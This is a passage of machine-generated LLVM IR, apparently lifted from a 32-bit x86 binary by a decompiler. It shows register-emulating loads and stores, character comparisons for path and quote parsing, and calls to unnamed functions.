  %v7_8049daf = and i32 %v6_8049daf, %v2_8049da7
  %v8_8049daf = icmp slt i32 %v7_8049daf, 0
  %v9_8049daf = icmp eq i32 %v1_8049daf, 0
  store i1 %v9_8049daf, i1* %zf.global-to-local, align 1
  %v10_8049daf = icmp slt i32 %v1_8049daf, 0
  %v3_8049db2 = icmp eq i1 %v10_8049daf, %v8_8049daf
  %v4_8049db2 = icmp eq i1 %v9_8049daf, false
  %v5_8049db2 = and i1 %v4_8049db2, %v3_8049db2
  br i1 %v5_8049db2, label %dec_label_pc_80496c3, label %dec_label_pc_8049db8

dec_label_pc_8049db8:                             ; preds = %dec_label_pc_8049da3
  %v2_8049db8 = add i32 %v0_8049dac, 12
  %v3_8049db8 = inttoptr i32 %v2_8049db8 to i32*
  store i32 %v2_8049da7, i32* %v3_8049db8, align 4
  %v2_8049db9 = add i32 %v0_8049dac, 8
  %v3_8049db9 = inttoptr i32 %v2_8049db9 to i32*
  store i32 %v2_8049da7, i32* %v3_8049db9, align 4
  %v0_8049dba = load i32, i32* @edi, align 4
  %v2_8049dba = add i32 %v0_8049dac, 4
  %v3_8049dba = inttoptr i32 %v2_8049dba to i32*
  store i32 %v0_8049dba, i32* %v3_8049dba, align 4
  %v1_8049dbb = add i32 %v0_8049dac, 108
  %v2_8049dbb = inttoptr i32 %v1_8049dbb to i32*
  %v3_8049dbb = load i32, i32* %v2_8049dbb, align 4
  store i32 %v3_8049dbb, i32* %edx.global-to-local, align 4
  %v1_8049dbf = add i32 %v3_8049dbb, 16
  %v2_8049dbf = inttoptr i32 %v1_8049dbf to i32*
  %v3_8049dbf = load i32, i32* %v2_8049dbf, align 4
  %v2_8049dc2 = mul i32 %v3_8049dbf, 128
  %v3_8049dc2 = icmp eq i32 %v2_8049dc2, 0
  store i1 %v3_8049dc2, i1* %zf.global-to-local, align 1
  %v0_8049dc5 = load i32, i32* @ebp, align 4
  %v2_8049dc5 = add i32 %v0_8049dc5, %v2_8049dc2
  store i32 %v2_8049dc5, i32* %eax.global-to-local, align 4
  %v3_8049dc9 = inttoptr i32 %v0_8049dac to i32*
  store i32 %v2_8049dc5, i32* %v3_8049dc9, align 4
  %v3_8049dca = call i32 @function_8052600(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049dca, i32* %eax.global-to-local, align 4
  %v0_8049dcf = load i32, i32* @esp, align 4
  %v1_8049dcf = add i32 %v0_8049dcf, 108
  %v2_8049dcf = inttoptr i32 %v1_8049dcf to i32*
  %v3_8049dcf = load i32, i32* %v2_8049dcf, align 4
  store i32 %v3_8049dcf, i32* %ecx.global-to-local, align 4
  %v1_8049dd3 = add i32 %v3_8049dcf, 16
  %v2_8049dd3 = inttoptr i32 %v1_8049dd3 to i32*
  %v3_8049dd3 = load i32, i32* %v2_8049dd3, align 4
  %v2_8049dd6 = mul i32 %v3_8049dd3, 128
  %v3_8049dd6 = icmp eq i32 %v2_8049dd6, 0
  store i1 %v3_8049dd6, i1* %zf.global-to-local, align 1
  %v0_8049dd9 = load i32, i32* @ebp, align 4
  %v2_8049dd9 = add i32 %v0_8049dd9, %v2_8049dd6
  store i32 %v2_8049dd9, i32* %ebx.global-to-local, align 4
  %v2_8049ddd = inttoptr i32 %v0_8049dcf to i32*
  store i32 %v2_8049dd9, i32* %v2_8049ddd, align 4
  %v2_8049de0 = call i32 @function_80525e0(i8* %v1_8048752)
  store i32 %v2_8049de0, i32* %eax.global-to-local, align 4
  %v0_8049de5 = load i32, i32* @esp, align 4
  %v1_8049de5 = inttoptr i32 %v0_8049de5 to i32*
  %v2_8049de5 = load i32, i32* %v1_8049de5, align 4
  store i32 %v2_8049de5, i32* %ecx.global-to-local, align 4
  %v3_8049de5 = add i32 %v0_8049de5, 4
  %v0_8049de6 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8049de6 = add i32 %v0_8049de6, %v2_8049de0
  %v12_8049de6 = icmp eq i32 %v2_8049de6, 0
  store i1 %v12_8049de6, i1* %zf.global-to-local, align 1
  store i32 %v2_8049de6, i32* @ebx, align 4
  %v1_8049de8 = inttoptr i32 %v3_8049de5 to i32*
  store i32 ptrtoint (i32* @global_var_80554b3.19 to i32), i32* %v1_8049de8, align 4
  %v0_8049dee = load i32, i32* @ebx, align 4
  store i32 %v0_8049dee, i32* %v1_8049de5, align 4
  %v3_8049def = call i32 @function_8052600(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049def, i32* %eax.global-to-local, align 4
  %v0_8049df4 = load i32, i32* @esp, align 4
  %v1_8049df4 = add i32 %v0_8049df4, 56
  %v2_8049df4 = inttoptr i32 %v1_8049df4 to i32*
  %v3_8049df4 = load i32, i32* %v2_8049df4, align 4
  store i32 %v3_8049df4, i32* %ebx.global-to-local, align 4
  %v1_8049df8 = add i32 %v0_8049df4, -4
  %v2_8049df8 = inttoptr i32 %v1_8049df8 to i32*
  store i32 1, i32* %v2_8049df8, align 4
  %v1_8049dfa = add i32 %v0_8049df4, -8
  %v2_8049dfa = inttoptr i32 %v1_8049dfa to i32*
  store i32 ptrtoint (i32* @global_var_80554ba.16 to i32), i32* %v2_8049dfa, align 4
  %v1_8049dff = add i32 %v0_8049df4, 108
  %v2_8049dff = inttoptr i32 %v1_8049dff to i32*
  %v3_8049dff = load i32, i32* %v2_8049dff, align 4
  store i32 %v3_8049dff, i32* %edx.global-to-local, align 4
  %v0_8049e03 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8049e03 = add i32 %v0_8049e03, 3
  store i32 %v1_8049e03, i32* @ebx, align 4
  %v0_8049e06 = load i32, i32* @esi, align 4
  %v2_8049e06 = add i32 %v0_8049e06, %v1_8049e03
  store i32 %v2_8049e06, i32* @esi, align 4
  %v1_8049e08 = add i32 %v3_8049dff, 660
  %v2_8049e08 = inttoptr i32 %v1_8049e08 to i32*
  %v3_8049e08 = load i32, i32* %v2_8049e08, align 4
  %v2_8049e0e = sub i32 %v3_8049e08, %v1_8049e03
  %v12_8049e0e = icmp eq i32 %v2_8049e0e, 0
  store i1 %v12_8049e0e, i1* %zf.global-to-local, align 1
  store i32 %v2_8049e0e, i32* %eax.global-to-local, align 4
  %v2_8049e10 = add i32 %v0_8049df4, -12
  %v3_8049e10 = inttoptr i32 %v2_8049e10 to i32*
  store i32 %v2_8049e0e, i32* %v3_8049e10, align 4
  %v0_8049e11 = load i32, i32* @esi, align 4
  %v2_8049e11 = add i32 %v0_8049df4, -16
  %v3_8049e11 = inttoptr i32 %v2_8049e11 to i32*
  store i32 %v0_8049e11, i32* %v3_8049e11, align 4
  %v0_8049e12 = call i32 @function_8052690()
  store i32 %v0_8049e12, i32* %eax.global-to-local, align 4
  %v0_8049e17 = load i32, i32* @esp, align 4
  %v1_8049e17 = add i32 %v0_8049e17, 108
  %v2_8049e17 = inttoptr i32 %v1_8049e17 to i32*
  %v3_8049e17 = load i32, i32* %v2_8049e17, align 4
  store i32 %v3_8049e17, i32* %edx.global-to-local, align 4
  %v0_8049e1b = load i32, i32* @ebx, align 4
  %v2_8049e1b = add i32 %v0_8049e1b, %v3_8049e17
  store i32 %v2_8049e1b, i32* %ebx.global-to-local, align 4
  %v2_8049e1d = add i32 %v0_8049e12, 2115
  %v3_8049e1d = add i32 %v2_8049e1d, %v2_8049e1b
  %v4_8049e1d = inttoptr i32 %v3_8049e1d to i8*
  store i8 0, i8* %v4_8049e1d, align 1
  %v0_8049e25 = load i32, i32* @esp, align 4
  %v1_8049e25 = add i32 %v0_8049e25, 124
  %v2_8049e25 = inttoptr i32 %v1_8049e25 to i32*
  %v3_8049e25 = load i32, i32* %v2_8049e25, align 4
  store i32 %v3_8049e25, i32* %ecx.global-to-local, align 4
  %v1_8049e2c = add i32 %v3_8049e25, 16
  %v2_8049e2c = inttoptr i32 %v1_8049e2c to i32*
  %v3_8049e2c = load i32, i32* %v2_8049e2c, align 4
  %v2_8049e2f = mul i32 %v3_8049e2c, 128
  %v3_8049e2f = icmp eq i32 %v2_8049e2f, 0
  store i1 %v3_8049e2f, i1* %zf.global-to-local, align 1
  %v0_8049e32 = load i32, i32* @ebp, align 4
  %v2_8049e32 = add i32 %v0_8049e32, %v2_8049e2f
  store i32 %v2_8049e32, i32* %ebx.global-to-local, align 4
  %v2_8049e36 = add i32 %v0_8049e25, 16
  %v3_8049e36 = inttoptr i32 %v2_8049e36 to i32*
  store i32 %v2_8049e32, i32* %v3_8049e36, align 4
  %v2_8049e37 = call i32 @function_80525e0(i8* %v1_8048752)
  store i32 %v2_8049e37, i32* %eax.global-to-local, align 4
  %v0_8049e3c = load i32, i32* @esp, align 4
  %v1_8049e3c = inttoptr i32 %v0_8049e3c to i32*
  %v2_8049e3c = load i32, i32* %v1_8049e3c, align 4
  store i32 %v2_8049e3c, i32* %ecx.global-to-local, align 4
  %v3_8049e3c = add i32 %v0_8049e3c, 4
  %v0_8049e3d = load i32, i32* %ebx.global-to-local, align 4
  %v2_8049e3d = add i32 %v0_8049e3d, %v2_8049e37
  %v12_8049e3d = icmp eq i32 %v2_8049e3d, 0
  store i1 %v12_8049e3d, i1* %zf.global-to-local, align 1
  store i32 %v2_8049e3d, i32* @ebx, align 4
  %v1_8049e3f = inttoptr i32 %v3_8049e3c to i32*
  %v2_8049e3f = load i32, i32* %v1_8049e3f, align 4
  store i32 %v2_8049e3f, i32* @edi, align 4
  %v0_8049e40 = load i32, i32* @esi, align 4
  store i32 %v0_8049e40, i32* %v1_8049e3f, align 4
  %v0_8049e41 = load i32, i32* @ebx, align 4
  store i32 %v0_8049e41, i32* %v1_8049e3c, align 4
  %v3_8049e42 = call i32 @function_8052600(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049e42, i32* %eax.global-to-local, align 4
  %v0_8049e47 = load i32, i32* @esp, align 4
  %v1_8049e47 = add i32 %v0_8049e47, 108
  %v2_8049e47 = inttoptr i32 %v1_8049e47 to i32*
  %v3_8049e47 = load i32, i32* %v2_8049e47, align 4
  store i32 %v3_8049e47, i32* %eax.global-to-local, align 4
  %v1_8049e4b = add i32 %v3_8049e47, 16
  %v2_8049e4b = inttoptr i32 %v1_8049e4b to i32*
  %v3_8049e4b = load i32, i32* %v2_8049e4b, align 4
  %v1_8049e51 = add i32 %v3_8049e4b, 1
  %v8_8049e51 = icmp eq i32 %v1_8049e51, 0
  store i1 %v8_8049e51, i1* %zf.global-to-local, align 1
  store i32 %v1_8049e51, i32* %edx.global-to-local, align 4
  store i32 %v1_8049e51, i32* %v2_8049e4b, align 4
  %v0_80496c3.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80496c3

dec_label_pc_8049e5a:                             ; preds = %dec_label_pc_804974f
  store i32 %v3_8049e5a, i32* %eax.global-to-local, align 4
  %v1_8049e5e = add i32 %v3_8049e5a, -1448
  %v2_8049e5e = inttoptr i32 %v1_8049e5e to i8*
  store i8 1, i8* %v2_8049e5e, align 1
  br label %dec_label_pc_8048d91

dec_label_pc_8049e6a:                             ; preds = %dec_label_pc_8049a11
  %v1_8049e6a = add i32 %v0_8049a34, 20916
  %v2_8049e6a = inttoptr i32 %v1_8049e6a to i32*
  store i32 7, i32* %v2_8049e6a, align 4
  %v0_8049e75 = load i32, i32* @ebx, align 4
  %v1_8049e75 = add i32 %v0_8049e75, 4
  %v2_8049e75 = inttoptr i32 %v1_8049e75 to i8*
  %v3_8049e75 = load i8, i8* %v2_8049e75, align 1
  %v12_8049e75 = icmp eq i8 %v3_8049e75, 115
  store i1 %v12_8049e75, i1* %zf.global-to-local, align 1
  %v1_8049e79 = icmp eq i1 %v12_8049e75, false
  br i1 %v1_8049e79, label %dec_label_pc_8049e86, label %dec_label_pc_8049e7b

dec_label_pc_8049e7b:                             ; preds = %dec_label_pc_8049e6a
  %v0_8049e7b = load i32, i32* @esp, align 4
  %v1_8049e7b = add i32 %v0_8049e7b, 20900
  %v2_8049e7b = inttoptr i32 %v1_8049e7b to i32*
  store i32 8, i32* %v2_8049e7b, align 4
  br label %dec_label_pc_8049e86

dec_label_pc_8049e86:                             ; preds = %dec_label_pc_8049e6a, %dec_label_pc_8049e7b
  %v0_8049e86 = load i32, i32* @esp, align 4
  %v1_8049e86 = add i32 %v0_8049e86, 20900
  %v2_8049e86 = inttoptr i32 %v1_8049e86 to i32*
  %v3_8049e86 = load i32, i32* %v2_8049e86, align 4
  store i32 %v3_8049e86, i32* %edx.global-to-local, align 4
  %v2_8049e8d = add i32 %v0_8049e86, -4
  %v3_8049e8d = inttoptr i32 %v2_8049e8d to i32*
  store i32 4, i32* %v3_8049e8d, align 4
  %v0_8049e8e = load i32, i32* @edi, align 4
  %v1_8049e8e = add i32 %v0_8049e8e, 1
  %v1_8049e91 = load i32, i32* %edx.global-to-local, align 4
  %v2_8049e91 = sub i32 %v1_8049e8e, %v1_8049e91
  %v12_8049e91 = icmp eq i32 %v2_8049e91, 0
  store i1 %v12_8049e91, i1* %zf.global-to-local, align 1
  store i32 %v2_8049e91, i32* %eax.global-to-local, align 4
  %v0_8049e93 = load i32, i32* @ebx, align 4
  %v2_8049e93 = add i32 %v0_8049e93, %v1_8049e91
  store i32 %v2_8049e93, i32* %edx.global-to-local, align 4
  %v2_8049e96 = add i32 %v0_8049e86, -8
  %v3_8049e96 = inttoptr i32 %v2_8049e96 to i32*
  store i32 %v2_8049e91, i32* %v3_8049e96, align 4
  %v0_8049e97 = load i32, i32* %edx.global-to-local, align 4
  %v2_8049e97 = add i32 %v0_8049e86, -12
  %v3_8049e97 = inttoptr i32 %v2_8049e97 to i32*
  store i32 %v0_8049e97, i32* %v3_8049e97, align 4
  %v0_8049e98 = load i32, i32* @ebx, align 4
  %v2_8049e98 = add i32 %v0_8049e86, -16
  %v3_8049e98 = inttoptr i32 %v2_8049e98 to i32*
  store i32 %v0_8049e98, i32* %v3_8049e98, align 4
  %v4_8049e99 = call i32 @function_80530e3(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8049e99, i32* %eax.global-to-local, align 4
  %v0_8049e9e = load i32, i32* @esp, align 4
  %v1_8049e9e = add i32 %v0_8049e9e, 20916
  %v2_8049e9e = inttoptr i32 %v1_8049e9e to i32*
  store i32 0, i32* %v2_8049e9e, align 4
  %v0_8049ea9 = load i32, i32* @esp, align 4
  %v6_8049ea9 = icmp eq i32 %v0_8049ea9, -16
  store i1 %v6_8049ea9, i1* %zf.global-to-local, align 1
  %v0_8049eac = load i32, i32* @ebx, align 4
  %v1_8049eac = inttoptr i32 %v0_8049eac to i8*
  %v2_8049eac = load i8, i8* %v1_8049eac, align 1
  %v3_8049eac = zext i8 %v2_8049eac to i32
  %v5_8049eac = and i32 %v4_8049e99, -256
  %v6_8049eac = or i32 %v3_8049eac, %v5_8049eac
  store i32 %v6_8049eac, i32* %eax.global-to-local, align 4
  %v4_8049eae = icmp eq i8 %v2_8049eac, 0
  store i1 %v4_8049eae, i1* %zf.global-to-local, align 1
  br i1 %v4_8049eae, label %dec_label_pc_8049ce8, label %dec_label_pc_8049eb6

dec_label_pc_8049eb6:                             ; preds = %dec_label_pc_8049e86
  store i32 %v0_8049eac, i32* %ecx.global-to-local, align 4
  %v10_8049eb8 = icmp eq i8 %v2_8049eac, 47
  store i1 %v10_8049eb8, i1* %zf.global-to-local, align 1
  br i1 %v10_8049eb8, label %dec_label_pc_8049ce5, label %dec_label_pc_8049ec0

dec_label_pc_8049ec0:                             ; preds = %dec_label_pc_8049eb6
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_8049ed1196 = add i32 %v0_8049eac, 1
  store i32 %v2_8049ed1196, i32* %ecx.global-to-local, align 4
  %v2_8049ed4197 = add i32 %v0_8049ea9, 20916
  %v3_8049ed4198 = inttoptr i32 %v2_8049ed4197 to i32*
  store i32 1, i32* %v3_8049ed4198, align 4
  %v0_8049edb199 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8049edb200 = inttoptr i32 %v0_8049edb199 to i8*
  %v2_8049edb201 = load i8, i8* %v1_8049edb200, align 1
  %v3_8049edb202 = zext i8 %v2_8049edb201 to i32
  %v4_8049edb203 = load i32, i32* %edx.global-to-local, align 4
  %v5_8049edb204 = and i32 %v4_8049edb203, -256
  %v6_8049edb205 = or i32 %v5_8049edb204, %v3_8049edb202
  store i32 %v6_8049edb205, i32* %edx.global-to-local, align 4
  %v4_8049edd206 = icmp eq i8 %v2_8049edb201, 0
  store i1 %v4_8049edd206, i1* %zf.global-to-local, align 1
  %v1_8049edf207 = icmp eq i1 %v4_8049edd206, false
  br i1 %v1_8049edf207, label %dec_label_pc_8049ec7, label %dec_label_pc_8049ce8

dec_label_pc_8049ec7:                             ; preds = %dec_label_pc_8049ec0, %dec_label_pc_8049ec7.dec_label_pc_8049ed1_crit_edge
  %v2_8049edb209 = phi i8 [ %v2_8049edb, %dec_label_pc_8049ec7.dec_label_pc_8049ed1_crit_edge ], [ %v2_8049edb201, %dec_label_pc_8049ec0 ]
  %v0_8049edb208 = phi i32 [ %v0_8049edb, %dec_label_pc_8049ec7.dec_label_pc_8049ed1_crit_edge ], [ %v0_8049edb199, %dec_label_pc_8049ec0 ]
  %v0_8049ec7 = load i32, i32* %eax.global-to-local, align 4
  %v1_8049ec7 = add i32 %v0_8049ec7, 1
  store i32 %v1_8049ec7, i32* %eax.global-to-local, align 4
  %v10_8049ec8 = icmp eq i8 %v2_8049edb209, 47
  store i1 %v10_8049ec8, i1* %zf.global-to-local, align 1
  br i1 %v10_8049ec8, label %dec_label_pc_8049ce5, label %dec_label_pc_8049ec7.dec_label_pc_8049ed1_crit_edge

dec_label_pc_8049ec7.dec_label_pc_8049ed1_crit_edge: ; preds = %dec_label_pc_8049ec7
  %v0_8049ed1.pre = load i32, i32* @ebx, align 4
  %v1_8049ed4.pre = load i32, i32* @esp, align 4
  %v2_8049ed1 = add i32 %v0_8049ed1.pre, %v1_8049ec7
  store i32 %v2_8049ed1, i32* %ecx.global-to-local, align 4
  %v2_8049ed4 = add i32 %v1_8049ed4.pre, 20900
  %v3_8049ed4 = inttoptr i32 %v2_8049ed4 to i32*
  store i32 %v1_8049ec7, i32* %v3_8049ed4, align 4
  %v0_8049edb = load i32, i32* %ecx.global-to-local, align 4
  %v1_8049edb = inttoptr i32 %v0_8049edb to i8*
  %v2_8049edb = load i8, i8* %v1_8049edb, align 1
  %v3_8049edb = zext i8 %v2_8049edb to i32
  %v4_8049edb = load i32, i32* %edx.global-to-local, align 4
  %v5_8049edb = and i32 %v4_8049edb, -256
  %v6_8049edb = or i32 %v5_8049edb, %v3_8049edb
  store i32 %v6_8049edb, i32* %edx.global-to-local, align 4
  %v4_8049edd = icmp eq i8 %v2_8049edb, 0
  store i1 %v4_8049edd, i1* %zf.global-to-local, align 1
  %v1_8049edf = icmp eq i1 %v4_8049edd, false
  br i1 %v1_8049edf, label %dec_label_pc_8049ec7, label %dec_label_pc_8049ce8

dec_label_pc_8049ee6:                             ; preds = %dec_label_pc_8049930
  %v0_8049ee6 = load i32, i32* %edx.global-to-local, align 4
  %v1_8049ee6 = add i32 %v0_8049ee6, 2
  store i32 %v1_8049ee6, i32* %eax.global-to-local, align 4
  %v1_8049ee9 = load i32, i32* @esp, align 4
  %v2_8049ee9 = add i32 %v1_8049ee9, 20900
  %v3_8049ee9 = inttoptr i32 %v2_8049ee9 to i32*
  store i32 %v1_8049ee6, i32* %v3_8049ee9, align 4
  %v0_8049951.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804994e

dec_label_pc_8049ef5:                             ; preds = %dec_label_pc_80499c3
  %v1_8049ef5 = add i32 %v3_80499c3, 1
  store i32 %v1_8049ef5, i32* %ebx.global-to-local, align 4
  store i32 %v1_8049ef5, i32* %v2_80499c3, align 4
  %v0_8049eff = load i32, i32* @esp, align 4
  %v9_8049eff = icmp eq i32 %v0_8049eff, 12
  store i1 %v9_8049eff, i1* %zf.global-to-local, align 1
  %v0_8049f02 = load i32, i32* @esi, align 4
  %v1_8049f02 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8049f02 = add i32 %v1_8049f02, %v0_8049f02
  store i32 %v2_8049f02, i32* @ebx, align 4
  %v2_8049f05 = add i32 %v0_8049eff, -16
  %v3_8049f05 = inttoptr i32 %v2_8049f05 to i32*
  store i32 %v2_8049f02, i32* %v3_8049f05, align 4
  %v2_8049f06 = call i32 @function_80525e0(i8* %v1_8048752)
  store i32 %v2_8049f06, i32* %eax.global-to-local, align 4
  %v0_8049f0b = load i32, i32* @esp, align 4
  %v1_8049f0b = add i32 %v0_8049f0b, 16
  %v6_8049f0b = icmp eq i32 %v1_8049f0b, 0
  store i1 %v6_8049f0b, i1* %zf.global-to-local, align 1
  %v0_8049f0e = load i32, i32* @ebx, align 4
  %v2_8049f0e = add i32 %v2_8049f06, -1
  %v3_8049f0e = add i32 %v2_8049f0e, %v0_8049f0e
  %v4_8049f0e = inttoptr i32 %v3_8049f0e to i8*
  %v5_8049f0e = load i8, i8* %v4_8049f0e, align 1
  %v14_8049f0e = icmp eq i8 %v5_8049f0e, 34
  store i1 %v14_8049f0e, i1* %zf.global-to-local, align 1
  %v1_8049f13 = icmp eq i1 %v14_8049f0e, false
  br i1 %v1_8049f13, label %dec_label_pc_80499d4, label %dec_label_pc_8049f19

dec_label_pc_8049f19:                             ; preds = %dec_label_pc_8049ef5
  %v1_8049f19 = add i32 %v0_8049f0b, 20916
  %v2_8049f19 = inttoptr i32 %v1_8049f19 to i32*
  %v3_8049f19 = load i32, i32* %v2_8049f19, align 4
  store i32 %v3_8049f19, i32* %eax.global-to-local, align 4
  %v0_8049f20 = load i32, i32* @esi, align 4
  %v2_8049f25 = add i32 %v0_8049f20, %v3_8049f19
  %v12_8049f25 = icmp eq i32 %v2_8049f25, 0
  store i1 %v12_8049f25, i1* %zf.global-to-local, align 1
  store i32 %v2_8049f25, i32* @ebx, align 4
  %v3_8049f27 = inttoptr i32 %v0_8049f0b to i32*
  store i32 %v2_8049f25, i32* %v3_8049f27, align 4
  %v2_8049f28 = call i32 @function_80525e0(i8* %v1_8048752)
  store i32 %v2_8049f28, i32* %eax.global-to-local, align 4
  %v0_8049f2d = load i32, i32* @esp, align 4
  %v6_8049f2d = icmp eq i32 %v0_8049f2d, -16
  store i1 %v6_8049f2d, i1* %zf.global-to-local, align 1
  %v0_8049f30 = load i32, i32* @ebx, align 4
  %v2_8049f30 = add i32 %v2_8049f28, -1
  %v3_8049f30 = add i32 %v2_8049f30, %v0_8049f30
  %v4_8049f30 = inttoptr i32 %v3_8049f30 to i8*
  store i8 0, i8* %v4_8049f30, align 1
  %v0_80499d4.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_80499d4.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80499d4

dec_label_pc_8049f3a:                             ; preds = %dec_label_pc_804848a
  %v9_8049f3a = icmp eq i32 %v0_80484a0, 12
  store i1 %v9_8049f3a, i1* %zf.global-to-local, align 1
  %v1_8049f3d = add i32 %v0_80484a0, -16
  %v2_8049f3d = inttoptr i32 %v1_8049f3d to i32*
  store i32 47, i32* %v2_8049f3d, align 4
  %v2_8049f3f = call i32 @function_8051c90(i8 %v1_8049f3f)
  store i32 %v2_8049f3f, i32* %eax.global-to-local, align 4
  %v0_8049f44 = load i32, i32* @esp, align 4
  %v1_8049f44 = inttoptr i32 %v0_8049f44 to i32*
  %v2_8049f44 = load i32, i32* %v1_8049f44, align 4
  store i32 %v2_8049f44, i32* @ebx, align 4
  %v3_8049f44 = add i32 %v0_8049f44, 4
  %v1_8049f45 = inttoptr i32 %v3_8049f44 to i32*
  store i32 0, i32* %v1_8049f45, align 4
  store i32 47, i32* %v1_8049f44, align 4
  %v3_8049f4a = call i32 @function_8051be0(i32 %tmp, i32* nonnull @0)
  store i32 %v3_8049f4a, i32* %eax.global-to-local, align 4
  %v0_8049f4f = load i32, i32* @esp, align 4
  %v1_8049f4f = inttoptr i32 %v0_8049f4f to i32*
  %v2_8049f4f = load i32, i32* %v1_8049f4f, align 4
  store i32 %v2_8049f4f, i32* %edx.global-to-local, align 4
  %v3_8049f4f = add i32 %v0_8049f4f, 4
  %v1_8049f50 = inttoptr i32 %v3_8049f4f to i32*
  %v2_8049f50 = load i32, i32* %v1_8049f50, align 4
  store i32 %v2_8049f50, i32* %ecx.global-to-local, align 4
  store i32 %v3_8049f4a, i32* %v1_8049f50, align 4
  %v0_8049f52 = load i32, i32* @esi, align 4
  %v1_8049f52 = add i32 %v0_8049f52, 20
  store i32 %v1_8049f52, i32* %eax.global-to-local, align 4
  store i32 %v1_8049f52, i32* %v1_8049f4f, align 4
  %v3_8049f56 = call i32 @function_8052600(i8* %v2_8049f7d, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049f56, i32* %eax.global-to-local, align 4
  %v0_8049f5b = load i32, i32* @esp, align 4
  %v1_8049f5b = inttoptr i32 %v0_8049f5b to i32*
  store i32 47, i32* %v1_8049f5b, align 4
  %v2_8049f62 = call i32 @function_8051c10(i8 %v1_8049f3f)
  store i32 %v2_8049f62, i32* %eax.global-to-local, align 4
  %v0_8049f67 = load i32, i32* @esp, align 4
  %v1_8049f67 = add i32 %v0_8049f67, 16
  %v6_8049f67 = icmp eq i32 %v1_8049f67, 0
  store i1 %v6_8049f67, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8049f6a

dec_label_pc_8049f6a:                             ; preds = %dec_label_pc_804848a, %dec_label_pc_804a062, %dec_label_pc_8049ff8, %dec_label_pc_8049fc3, %dec_label_pc_8049f3a
  %v1_8049f6a = phi i32 [ %v0_80484a0, %dec_label_pc_804848a ], [ %v1_804a08f, %dec_label_pc_804a062 ], [ %v1_804a025, %dec_label_pc_8049ff8 ], [ %v1_8049ff0, %dec_label_pc_8049fc3 ], [ %v1_8049f67, %dec_label_pc_8049f3a ]
  %v0_8049f6a = phi i32 [ %v2_80484ac, %dec_label_pc_804848a ], [ %v2_804a08a, %dec_label_pc_804a062 ], [ %v2_804a020, %dec_label_pc_8049ff8 ], [ %v2_8049feb, %dec_label_pc_8049fc3 ], [ %v2_8049f62, %dec_label_pc_8049f3a ]
  %v2_8049f6a = add i32 %v1_8049f6a, -4
  %v3_8049f6a = inttoptr i32 %v2_8049f6a to i32*
  store i32 %v0_8049f6a, i32* %v3_8049f6a, align 4
  %v0_8049f6b = load i32, i32* %eax.global-to-local, align 4
  %v2_8049f6b = add i32 %v1_8049f6a, -8
  %v3_8049f6b = inttoptr i32 %v2_8049f6b to i32*
  store i32 %v0_8049f6b, i32* %v3_8049f6b, align 4
  %v1_8049f6c = add i32 %v1_8049f6a, 64
  %v2_8049f6c = inttoptr i32 %v1_8049f6c to i32*
  %v3_8049f6c = load i32, i32* %v2_8049f6c, align 4
  store i32 %v3_8049f6c, i32* %eax.global-to-local, align 4
  %v0_8049f70 = load i32, i32* @ebp, align 4
  %v1_8049f70 = add i32 %v0_8049f70, 1
  store i32 %v1_8049f70, i32* @ebp, align 4
  %v2_8049f71 = add i32 %v1_8049f6a, -12
  %v3_8049f71 = inttoptr i32 %v2_8049f71 to i32*
  store i32 %v3_8049f6c, i32* %v3_8049f71, align 4
  %v0_8049f72 = load i32, i32* @esi, align 4
  %v1_8049f72 = add i32 %v0_8049f72, 3140
  %v9_8049f72 = icmp eq i32 %v1_8049f72, 0
  store i1 %v9_8049f72, i1* %zf.global-to-local, align 1
  store i32 %v1_8049f72, i32* @esi, align 4
  %v1_8049f78 = add i32 %v1_8049f6a, 36
  %v2_8049f78 = inttoptr i32 %v1_8049f78 to i32*
  %v3_8049f78 = load i32, i32* %v2_8049f78, align 4
  store i32 %v3_8049f78, i32* @edi, align 4
  %v2_8049f7c = add i32 %v1_8049f6a, -16
  %v3_8049f7c = inttoptr i32 %v2_8049f7c to i32*
  store i32 %v3_8049f78, i32* %v3_8049f7c, align 4
  %v3_8049f7d = call i32 @function_8052600(i8* %v2_8049f7d, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049f7d, i32* %eax.global-to-local, align 4
  %v0_8049f82 = load i32, i32* @esp, align 4
  %v1_8049f85 = add i32 %v0_8049f82, 128
  %v2_8049f85 = inttoptr i32 %v1_8049f85 to i32*
  %v3_8049f85 = load i32, i32* %v2_8049f85, align 4
  %v4_8049f85 = load i32, i32* @ebp, align 4
  %v15_8049f85 = icmp eq i32 %v3_8049f85, %v4_8049f85
  store i1 %v15_8049f85, i1* %zf.global-to-local, align 1
  %v1_8049f89 = icmp eq i1 %v15_8049f85, false
  br i1 %v1_8049f89, label %dec_label_pc_8049f6a.dec_label_pc_80483a7_crit_edge, label %dec_label_pc_8049f8f

dec_label_pc_8049f6a.dec_label_pc_80483a7_crit_edge: ; preds = %dec_label_pc_8049f6a
  %v0_80483a9.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80483a7

dec_label_pc_8049f8f:                             ; preds = %dec_label_pc_8049f6a
  %v1_8049f8f = add i32 %v0_8049f82, 20756
  store i32 %v1_8049f8f, i32* %edx.global-to-local, align 4
  %v1_8049f96 = add i32 %v0_8049f82, 64
  %v2_8049f96 = inttoptr i32 %v1_8049f96 to i32*
  %v3_8049f96 = load i32, i32* %v2_8049f96, align 4
  store i32 %v3_8049f96, i32* %eax.global-to-local, align 4
  %v2_8049f9a = add i32 %v0_8049f82, 40
  %v3_8049f9a = inttoptr i32 %v2_8049f9a to i32*
  store i32 %v1_8049f8f, i32* %v3_8049f9a, align 4
  %v0_8049f9e = load i32, i32* @esp, align 4
  %v1_8049f9e = add i32 %v0_8049f9e, 48
  %v2_8049f9e = inttoptr i32 %v1_8049f9e to i32*
  %v3_8049f9e = load i32, i32* %v2_8049f9e, align 4
